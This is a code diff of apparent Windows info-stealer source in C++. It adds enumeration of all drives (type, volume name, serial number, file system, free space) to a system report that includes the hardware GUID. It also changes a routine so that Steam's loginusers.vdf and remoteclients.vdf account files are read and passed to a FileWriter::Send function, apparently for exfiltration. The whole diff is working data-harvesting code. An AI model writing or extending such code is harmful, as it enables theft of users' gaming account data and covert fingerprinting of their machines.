@@ -256,9 +256,75 @@ void Info::SystemInfo() {
     HW_PROFILE_INFO hwProfileInfo;
     if (GetCurrentHwProfile(&hwProfileInfo))
         report += "HWID: " + std::string(hwProfileInfo.szHwProfileGuid) + "\n";
-    
+    DWORD drives = GetLogicalDrives();
+    if (drives == 0) {
+        std::cerr << "GetLogicalDrives failed with error: " << GetLastError() << std::endl;
+        return;
+    }
+
+    for (char driveLetter = 'A'; driveLetter <= 'Z'; ++driveLetter) {
+        if (drives & (1 << (driveLetter - 'A'))) {
+            std::string driveRoot = std::string(1, driveLetter) + ":\\";
+            UINT driveType = GetDriveTypeA(driveRoot.c_str());
+
+            report += "Drive: " + driveRoot + "\n";
+
+            switch (driveType) {
+            case DRIVE_UNKNOWN:
+                report += "Type: Unknown\n";
+                break;
+            case DRIVE_NO_ROOT_DIR:
+                report += "Type: Invalid root path\n";
+                break;
+            case DRIVE_REMOVABLE:
+                report += "Type: Removable\n";
+                break;
+            case DRIVE_FIXED:
+                report += "Type: Fixed\n";
+                break;
+            case DRIVE_REMOTE:
+                report += "Type: Remote\n";
+                break;
+            case DRIVE_CDROM:
+                report += "Type: CD-ROM\n";
+                break;
+            case DRIVE_RAMDISK:
+                report += "Type: RAM Disk\n";
+                break;
+            default:
+                report += "Type: Other\n";
+                break;
+            }
+
+            char volumeName[MAX_PATH] = { 0 };
+            char fileSystemName[MAX_PATH] = { 0 };
+            DWORD serialNumber = 0, maxComponentLength = 0, fileSystemFlags = 0;
+
+            if (GetVolumeInformationA(driveRoot.c_str(), volumeName, sizeof(volumeName), &serialNumber, &maxComponentLength, &fileSystemFlags, fileSystemName, sizeof(fileSystemName))) {
+                report += "Volume Name: " + std::string(volumeName) + "\n";
+                report += "Serial Number: " + std::to_string(serialNumber) + "\n";
+                report += "File System: " + std::string(fileSystemName) + "\n";
+            }
+            else {
+                std::cerr << "GetVolumeInformation failed with error: " << GetLastError() << std::endl;
+            }
+
+            ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
+            if (GetDiskFreeSpaceExA(driveRoot.c_str(), &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes)) {
+                report += "Total Space: " + std::to_string(totalNumberOfBytes.QuadPart / (1024 * 1024)) + " MB\n";
+                report += "Free Space: " + std::to_string(totalNumberOfFreeBytes.QuadPart / (1024 * 1024)) + " MB\n";
+            }
+            else {
+                std::cerr << "GetDiskFreeSpaceEx failed with error: " << GetLastError() << std::endl;
+            }
+
+            report += "\n";
+        }
+    }
 
     FileWriter::Send(report);
+
+
 }
 
 
@@ -286,14 +352,15 @@ void Info::SteamInfo() {
 
         std::filesystem::path configPath = std::filesystem::path(steamPath) / "config" / "loginusers.vdf";
         std::filesystem::path configPath1 = std::filesystem::path(steamPath) / "config" / "remoteclients.vdf";
-        if (!std::filesystem::exists(configPath)) {
+        if (!std::filesystem::exists(configPath) && !std::filesystem::exists(configPath1)) {
             //std::cerr << "steam loginusers.vdf file not found at " << configPath << std::endl;
             
         }
-
-        std::string vdfContent = readVDFFile(configPath.string());
-        std::string vdfContent1 = readVDFFile(configPath1.string());
-        FileWriter::Send(vdfContent);
-        FileWriter::Send(vdfContent1);
+        else {
+            std::string vdfContent = readVDFFile(configPath.string());
+            std::string vdfContent1 = readVDFFile(configPath1.string());
+            FileWriter::Send(vdfContent);
+            FileWriter::Send(vdfContent1);
+        }
     
 }
